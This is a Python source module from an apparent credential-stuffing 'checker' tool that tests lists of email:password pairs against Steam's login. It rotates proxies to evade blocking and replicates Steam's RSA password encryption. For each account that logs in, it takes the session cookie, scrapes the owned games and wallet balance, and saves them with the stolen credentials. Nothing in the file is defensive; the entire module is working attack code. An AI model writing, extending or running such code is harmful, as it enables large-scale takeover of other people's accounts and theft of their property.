from __main__ import checker
from modules.functions import bad_proxy, log,save,set_proxy
from json import loads
from requests import get,post
from time import time
from rsa import encrypt,PublicKey
from base64 import b64encode
from urllib.parse import quote

def check(email:str,password:str):
    retries = 0
    if "@" in email:
        username = email.split("@")[0]
    else:
        username = email
        email = "-"
    while retries != checker.retries:
        proxy = set_proxy()
        t_1 = int(time())
        data_1 = f"donotcache={t_1}&username={username}"
        data_2 = "donotcache={}&password={}&username={}&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={}&remember_login=false"
        length_1 = len(data_1)
        header_1 = {
            "content-type":"application/x-www-form-urlencoded",
            "Accept": "*/*" ,
            "Accept-Encoding": "gzip, deflate, br", 
            "Accept-Language": "fa,en;q=0.9,en-US;q=0.8" ,
            "Connection": "keep-alive" ,
            "Content-Length": str(length_1), 
            "Host": "store.steampowered.com" ,
            "Origin": "https://store.steampowered.com" ,
            "Referer": "https://store.steampowered.com/login/?redir=&redir_ssl=1" ,
            "Sec-Fetch-Dest": "empty" ,
            "Sec-Fetch-Mode": "cors" ,
            "Sec-Fetch-Site": "same-origin" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36" ,
            "X-Requested-With": "XMLHttpRequest"
        }
        header_2 = {
            "content-type": "application/x-www-form-urlencoded",
            "Accept": "*/*" ,
            "Accept-Encoding": "gzip, deflate, br" ,
            "Accept-Language": "fa,en;q=0.9,en-US;q=0.8" ,
            "Connection": "keep-alive" ,
            "Content-Length": "",
            "Host": "store.steampowered.com" ,
            "Origin": "https://store.steampowered.com" ,
            "Referer": "https://store.steampowered.com/login/?redir=&redir_ssl=1" ,
            "Sec-Fetch-Dest": "empty" ,
            "Sec-Fetch-Mode": "cors" ,
            "Sec-Fetch-Site": "same-origin" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36" ,
            "X-Requested-With": "XMLHttpRequest" 
        }
        header_3 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        try:
            keys = post("https://store.steampowered.com/login/getrsakey",data=data_1,headers=header_1,proxies=set_proxy(proxy),timeout=checker.timeout).json()
            k1 = keys["publickey_mod"]
            k2 = keys["publickey_exp"]
            t_2 = keys["timestamp"]
            
            encrypted_password = quote(b64encode(encrypt(password.encode(),PublicKey(int(k1,16), int(k2,16)))))
            length_2 = data_2.format(t_1,encrypted_password,username,t_2)
            header_2["Content-Length"] = str(length_2)

            response = post("https://store.steampowered.com/login/dologin/",data=data_2.format(t_1,encrypted_password,username,t_2),headers=header_2,proxies=set_proxy(proxy),timeout=checker.timeout)
            if "\"The account name or password that you have entered is incorrect.\"," in response.text:
                retries += 1
            elif "\",\"emailauth_needed\":true," in response.text:
                if not checker.cui:
                    log("custom",username+":"+password,"Steam")
                save("Steam","custom",checker.time,username+":"+password+f" | Email: {email}")
                checker.custom += 1
                checker.cpm += 1
                return
            elif "\"success\":true," in response.text:
                cookie = response.cookies["steamLoginSecure"]
                steamid = response.json()["transfer_parameters"]["steamid"]
                
                games = []
                games_list = loads(get(f"https://steamcommunity.com/profiles/{steamid}/games/?tab=all",headers=header_3,cookies={"steamLoginSecure":cookie},proxies=set_proxy(proxy),timeout=checker.timeout).text.split("var rgGames = ")[1].split(";")[0])
                for game in games_list:
                    games.append(game["name"])
                
                balance = get("https://store.steampowered.com/account/",cookies={"steamLoginSecure":cookie},proxies=set_proxy(proxy),timeout=checker.timeout).text.split('<div class="accountData price">')[1].split("</div>")[0]
                if not checker.cui:
                    log("good",username+":"+password,"Steam")
                save("Steam","good",checker.time,username+":"+password+f" | Games: {games} | Balance: {balance}")
                checker.good += 1
                checker.cpm += 1
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            checker.errors += 1
    if not checker.cui:
        log("bad",email+":"+password,"Steam")
    checker.bad += 1
    checker.cpm += 1
    return